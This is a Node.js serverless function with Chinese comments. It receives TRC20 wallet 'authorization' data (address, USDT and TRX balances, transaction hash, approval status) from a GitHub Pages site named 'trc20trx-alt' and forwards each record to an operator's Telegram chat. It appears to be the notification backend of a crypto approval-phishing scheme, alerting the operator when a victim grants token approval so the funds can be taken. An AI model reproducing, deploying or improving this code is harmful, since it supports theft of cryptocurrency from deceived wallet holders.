// 引入https模块（修复原代码中TELEGRAM_API_URL的语法错误）
const https = require('https');

module.exports = async function handler(req, res) {
  // 1. 原有CORS配置不变
  const allowedOrigin = "https://trc20trx-alt.github.io";
  res.setHeader("Access-Control-Allow-Origin", allowedOrigin);
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  // 2. 原有OPTIONS预请求处理不变
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  // 3. 原有请求方法校验不变
  if (req.method !== "POST") {
    return res.status(405).json({ error: "只支持POST请求" });
  }

  // ========== 核心修改1：新增“授权状态”字段（isApproved，布尔值易解析） ==========
  // 接收6个字段：原有5个 + isApproved（授权状态）
  const { address, tokenBalance, trxBalance, approveTime, txHash, isApproved = false } = req.body;
  
  // 原有必填字段校验不变（不影响现有功能）
  if (!address || !tokenBalance) {
    return res.status(400).json({ error: "缺少关键授权数据（address/tokenBalance）" });
  }

  // 4. 原有Telegram配置不变
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({ error: "后端未配置Telegram环境变量" });
  }

  // 修复原代码中TELEGRAM_API_URL的语法错误（模板字符串+https模块）
  const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    // ========== 核心修改2：Telegram消息中显示授权状态 ==========
    const message = `
🔔 TRC20授权通知！
📌 授权地址：${address}
💵 USDT余额：${tokenBalance || "未获取"} USDT
🪙 TRX余额：${trxBalance || "未获取"} TRX
⏰ 授权时间：${approveTime || new Date().toLocaleString()}
🔗 交易哈希：${txHash ? `<a href="https://tronscan.org/#/transaction/${txHash}">${txHash}</a>` : "未生成/授权失败"}
✅ 授权结果：${isApproved ? "授权成功" : "授权失败/用户取消"}
    `;

    // 5. 原有Telegram API调用不变
    // 使用https模块发送请求（修复原代码中fetch可能的环境问题）
    const response = await new Promise((resolve, reject) => {
      const request = https.request(TELEGRAM_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" }
      }, (res) => {
        let data = "";
        res.on("data", (chunk) => data += chunk);
        res.on("end", () => resolve(JSON.parse(data)));
      });
      request.on("error", (err) => reject(err));
      // 发送包含授权状态的数据
      request.write(JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: false
      }));
      request.end();
    });

    if (!response.ok) throw new Error(`Telegram API响应异常：${response.description || "未知错误"}`);
    res.status(200).json({ success: true, message: "Telegram通知已发送（含授权状态）" });
  } catch (error) {
    console.error("通知失败：", error);
    res.status(500).json({ error: "通知发送失败", detail: error.message });
  }
}
